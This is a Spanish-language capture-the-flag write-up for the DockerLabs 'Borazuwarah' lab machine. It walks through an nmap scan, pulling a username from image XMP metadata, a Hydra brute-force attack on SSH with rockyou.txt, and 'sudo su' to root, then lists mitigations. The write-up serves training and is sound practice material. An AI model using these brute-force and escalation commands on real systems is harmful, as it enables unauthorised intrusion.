# BorazuwarahCTF
Laboratorio para practicar estaganografía y fuerza bruta contra protocolos de red.
# Borazuwarah — Writeup

Resolución de la máquina **Borazuwarah** de [DockerLabs](https://dockerlabs.es).

| | |
|---|---|
| **Máquina** | Borazuwarah |
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **IP** | `172.17.0.2` |
| **Técnicas** | Enumeración web · Metadatos de imagen (XMP/EXIF) · Fuerza bruta SSH · Abuso de `sudo` |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Análisis de metadatos](#3-análisis-de-metadatos)
4. [Fuerza bruta SSH](#4-fuerza-bruta-ssh)
5. [Acceso inicial](#5-acceso-inicial)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Resumen de la cadena](#7-resumen-de-la-cadena)
8. [Mitigaciones](#8-mitigaciones)

---

## 1. Reconocimiento

Escaneo completo de puertos con detección de versión y scripts por defecto:

```bash
sudo nmap -p- -sS -sV -sC -vvv -Pn -n -T5 172.17.0.2
```

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
```

Dos puertos abiertos:

- **22/tcp** — SSH (OpenSSH 9.2p1 / Debian 12)
- **80/tcp** — HTTP (Apache 2.4.59)

Con solo SSH y un servidor web, el vector de entrada casi seguro pasa por obtener credenciales desde la web para después usarlas contra SSH.

---

## 2. Enumeración web

El servidor responde con un HTML mínimo que únicamente incrusta una imagen:

```bash
curl -s http://172.17.0.2
```

```html
<html><body><img src='imagen.jpeg'></body></html>
```

```bash
curl -I http://172.17.0.2
```

```
HTTP/1.1 200 OK
Server: Apache/2.4.59 (Debian)
Content-Length: 50
Content-Type: text/html
```

La página solo sirve una imagen (`imagen.jpeg`) — un huevo *Kinder Sorpresa* con la frase *"¡Te quiero!"*.

![Imagen servida en el puerto 80](assets/web-imagen.png)

Cuando una máquina "fácil" no tiene más que una imagen, el siguiente paso obligatorio es **revisar sus metadatos**: la sorpresa está dentro del huevo.

---

## 3. Análisis de metadatos

Descargamos la imagen y revisamos sus metadatos. Se pueden leer con `exiftool` o incluso con un simple `cat`, ya que la pista está en un bloque XMP en texto plano:

```bash
wget http://172.17.0.2/imagen.jpeg
exiftool imagen.jpeg
# o directamente:
cat imagen.jpeg
```

Dentro del bloque **XMP** (generado con ExifTool 12.76) aparecen las pistas escondidas en los campos `dc:description` y `dc:title`:

```xml
<dc:description>
 <rdf:Alt>
  <rdf:li xml:lang='x-default'>---------- User: borazuwarah ----------</rdf:li>
 </rdf:Alt>
</dc:description>
<dc:title>
 <rdf:Alt>
  <rdf:li xml:lang='x-default'>---------- Password:  ----------</rdf:li>
 </rdf:Alt>
</dc:title>
```

Obtenemos:

- **Usuario:** `borazuwarah`
- **Contraseña:** *(vacía — no está en los metadatos)*

Tenemos el usuario, pero no la contraseña. Toca conseguirla por fuerza bruta.

---

## 4. Fuerza bruta SSH

Con un usuario válido y SSH expuesto, lanzamos un ataque de diccionario con **Hydra** y el clásico `rockyou.txt`:

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

> 💡 Recomendación: SSH suele limitar las conexiones en paralelo. Conviene bajar los hilos con `-t 4` para evitar falsos negativos.

Resultado:

```
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
```

Credenciales encontradas:

```
borazuwarah : 123456
```

---

## 5. Acceso inicial

Nos conectamos por SSH con las credenciales obtenidas:

```bash
ssh borazuwarah@172.17.0.2
# password: 123456
```

> ⚠️ Si la máquina se ha reiniciado o reconstruido, SSH puede quejarse de que la clave del host ha cambiado (`REMOTE HOST IDENTIFICATION HAS CHANGED`). Se soluciona eliminando la clave antigua:
> ```bash
> ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
> ```

Ya dentro como `borazuwarah`:

```
borazuwarah@11c63f682e82:~$ id
borazuwarah@11c63f682e82:~$ ls /home
borazuwarah
```

El directorio `/root` está, como era de esperar, fuera de nuestro alcance:

```
borazuwarah@11c63f682e82:/$ cd root
-bash: cd: root: Permission denied
```

---

## 6. Escalada de privilegios

Comprobamos los privilegios `sudo` del usuario. En este caso, `borazuwarah` puede ejecutar comandos como `root`, y la contraseña de `sudo` es la misma que la de login:

```bash
sudo su
# [sudo] password for borazuwarah: 123456
```

```
root@11c63f682e82:/#
```

**Somos root.** 🏆

```bash
# Comprobación recomendada previa:
sudo -l
```

---

## 7. Resumen de la cadena

```
nmap                → puertos 22 (SSH) y 80 (HTTP)
   │
curl http://IP      → web solo sirve "imagen.jpeg"
   │
exiftool imagen     → XMP revela el usuario: borazuwarah
   │
hydra + rockyou     → contraseña SSH: 123456
   │
ssh borazuwarah     → acceso inicial (shell de usuario)
   │
sudo su             → root
```

| Fase | Vulnerabilidad | Herramienta |
|------|----------------|-------------|
| Recon | Servicios expuestos | `nmap` |
| Web | Fuga de información | `curl` |
| Metadatos | Usuario en XMP de la imagen | `exiftool` |
| Credenciales | Contraseña débil en SSH | `hydra` + `rockyou.txt` |
| Privesc | `sudo` sin restricciones | `sudo su` |

---

## 8. Mitigaciones

- **No incrustar información sensible en metadatos.** Limpiar los metadatos de cualquier recurso público (`exiftool -all= imagen.jpeg`).
- **Contraseñas robustas.** `123456` cae en el primer segundo contra cualquier diccionario. Exigir políticas de complejidad y longitud.
- **Proteger SSH.** Deshabilitar login por contraseña y usar claves; aplicar `fail2ban` o limitación de intentos para frenar la fuerza bruta.
- **Principio de mínimo privilegio.** Revisar `sudoers`: un usuario normal no debería poder hacer `sudo su` a `root` sin justificación.

---

